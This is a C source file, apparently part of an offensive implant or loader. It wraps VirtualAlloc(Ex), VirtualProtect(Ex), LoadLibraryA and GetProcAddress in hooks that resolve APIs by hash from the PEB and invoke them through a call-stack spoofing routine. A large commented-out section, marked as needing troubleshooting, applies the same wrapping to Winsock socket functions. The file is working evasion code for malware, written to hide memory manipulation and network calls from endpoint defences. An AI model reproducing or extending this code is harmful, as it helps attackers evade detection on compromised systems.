#include <Macros.h>
#include <Funcs.h>

SEC( text, B ) PVOID VirtualAllocHook(LPVOID lpAddress, SIZE_T dwSize, DWORD allocType, DWORD protType)
{
    PRM p       = { 0 };

    PrepSpoof( &p );

    PVOID pVirtualAlloc = LdrFunctionAddr( LdrModulePeb( K32_HASH ), H_VIRTUALALLOC );

    return Spoof( lpAddress, dwSize, (PVOID)allocType, (PVOID)protType, &p, pVirtualAlloc, (PVOID)0 );
}

SEC( text, B ) PVOID VirtualAllocExHook(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD allocType, DWORD protType)
{
    PRM p       = { 0 };

    PrepSpoof( &p );

    PVOID pVirtualAllocEx = LdrFunctionAddr( LdrModulePeb( K32_HASH ), H_VIRTUALALLOCEX ); 

    return Spoof( hProcess, lpAddress, dwSize, (PVOID)allocType, &p, pVirtualAllocEx, (PVOID)1, (PVOID)protType );
}

SEC( text, B ) PVOID VirtualProtectHook(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{

    PRM p       = { 0 };

    PrepSpoof( &p );

    PVOID pVirtualProtect = LdrFunctionAddr( LdrModulePeb( K32_HASH ), H_VIRTUALPROTECT );

    return Spoof( lpAddress, dwSize, (PVOID)flNewProtect, lpflOldProtect, &p, pVirtualProtect, (PVOID)0 );
}

SEC( text, B ) PVOID VirtualProtectExHook(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
    PRM p       = { 0 };

    PrepSpoof( &p );

    PVOID pVirtualProtectEx = LdrFunctionAddr( LdrModulePeb( K32_HASH ), H_VIRTUALPROTECTEX );

    return Spoof( hProcess, lpAddress, dwSize, (PVOID)flNewProtect, &p, pVirtualProtectEx, (PVOID)1, lpflOldProtect );
}

SEC( text, B ) PVOID LoadLibraryAHook( LPCSTR LibraryName )
{
    PRM p       = { 0 };

    PrepSpoof( &p );

    PVOID pLoadLibraryA = LdrFunctionAddr( LdrModulePeb( K32_HASH ), H_LOADLIBRARYA ); 

    return Spoof( LibraryName, NULL, NULL, NULL, &p, pLoadLibraryA, (PVOID)0 );
}

SEC( text, B ) PVOID GetProcAddressHook(PVOID HModule, LPCSTR Export)
{
    PRM p       = { 0 };

    PrepSpoof( &p );

    PVOID pGetProcAddr = LdrFunctionAddr( LdrModulePeb( K32_HASH ), H_GETPROCADDRESS );

    return Spoof( HModule, Export, NULL, NULL, &p, pGetProcAddr, (PVOID)0 );
}


// Need to troubleshoot these
// SEC( text, B ) PVOID ntohlHook( u_long netlong ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_ntohlAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_NTOHL );

//     return Spoof( (PVOID)netlong, NULL, NULL, NULL, &p, p_ntohlAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID htonlHook( u_long hostlong ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_htonlAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_HTONL );

//     return Spoof( (PVOID)hostlong, NULL, NULL, NULL, &p, p_htonlAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID freeaddrinfoHook( PADDRINFOA pAddrInfo ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_freeaddrinfoAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_FREEADDRINFO );

//     return Spoof( pAddrInfo, NULL, NULL, NULL, &p, p_freeaddrinfoAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID getaddrinfoHook( PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_getaddrinfoAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_GETADDRINFO );

//     return Spoof( pNodeName, pServiceName, *pHints, ppResult, &p, p_getaddrinfoAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID WSADuplicateSocketAHook( SOCKET s, DWORD dwProcessId, LPWSAPROTOCOL_INFOA lpProtocolInfo ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_WSADuplicateSocketAAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_WSADUPLICATESOCKETA );

//     return Spoof( (PVOID)s, (PVOID)dwProcessId, lpProtocolInfo, NULL, &p, p_WSADuplicateSocketAAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID WSAGetLastErrorHook( ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_WSAGetLastErrorAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_WSAGETLASTERROR );

//     return Spoof( NULL, NULL, NULL, NULL, &p, p_WSAGetLastErrorAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID WSAStartupHook( WORD wVersionRequired, LPWSADATA lpWSAData ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_WSAStartupAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_WSASTARTUP );

//     return Spoof( (PVOID)wVersionRequired, lpWSAData, NULL, NULL, &p, p_WSAStartupAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID gethostbynameHook( const char *name ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_gethostbynameAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_GETHOSTBYNAME );

//     return Spoof( name, NULL, NULL, NULL, &p, p_gethostbynameAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID socketHook( int af, int type, int protocol ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_socketAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_SOCKET );

//     return Spoof( (PVOID)af, (PVOID)type, (PVOID)protocol, NULL, &p, p_socketAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID setsockoptHook( SOCKET s, int level, int optname, const char *optval, int optlen){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_setsockoptAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_SETSOCKOPT );

//     return Spoof( (PVOID)s, (PVOID)level, (PVOID)optname, optval, &p, p_setsockoptAddr, (PVOID)1, (PVOID)optlen );

// }
  
// SEC( text, B ) PVOID sendHook( SOCKET s, const char *buf, int len, int flags ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_sendAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_SEND );

//     return Spoof( (PVOID)s, buf, (PVOID)len, (PVOID) flags, &p, p_sendAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID selectHook( int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const timeval *timeout ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_selectAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_SELECT );

//     return Spoof( (PVOID)nfds, readfds, writefds, exceptfds, &p, p_selectAddr, (PVOID)1, timeout );

// }
  
// SEC( text, B ) PVOID recvHook( SOCKET s, char *buf, int len, int flags ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_recvAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_RECV );
//     __debugbreak();
//     return Spoof( (PVOID)s, buf, (PVOID)len, (PVOID)flags, &p, p_recvAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID listenHook( SOCKET s, int backlog ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_listenAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_LISTEN );

//     return Spoof( (PVOID)s, (PVOID)backlog, NULL, NULL, &p, p_listenAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID inet_ntoaHook( in_addr* in ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_inet_ntoaAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_INET_NTOA );

//     return Spoof( in, NULL, NULL, NULL, &p, p_inet_ntoaAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID inet_addrHook( const char *cp ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_inet_addrAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_INET_ADDR );

//     return Spoof( cp, NULL, NULL, NULL, &p, p_inet_addrAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID connectHook( SOCKET s, const sockaddr *name, int namelen ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_connectAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_CONNECT );

//     return Spoof( (PVOID)s, name, (PVOID)namelen, NULL, &p, p_connectAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID closesocketHook( SOCKET s ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_closesocketAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_CLOSESOCKET );

//     return Spoof( s, NULL, NULL, NULL, &p, p_closesocketAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID bindHook( SOCKET s, const sockaddr *name, int  namelen ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_bindAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_BIND );

//     return Spoof( (PVOID)s, name, (PVOID)namelen, NULL, &p, p_bindAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID acceptHook( SOCKET s, sockaddr *addr, int *addrlen ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_acceptAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_ACCEPT );

//     return Spoof( (PVOID)s, addr, addrlen, NULL, &p, p_acceptAddr, (PVOID)0 );

// }
  
// SEC( text, B ) PVOID htonsHook( u_short hostshort ){

//     PRM p       = { 0 };

//     PrepSpoof( &p );

//     PVOID p_htonsAddr = LdrFunctionAddr( LdrModulePeb( WS2_32_HASH ), H_HTONS );

//     return Spoof( (PVOID)hostshort, NULL, NULL, NULL, &p, p_htonsAddr, (PVOID)0 );

// }
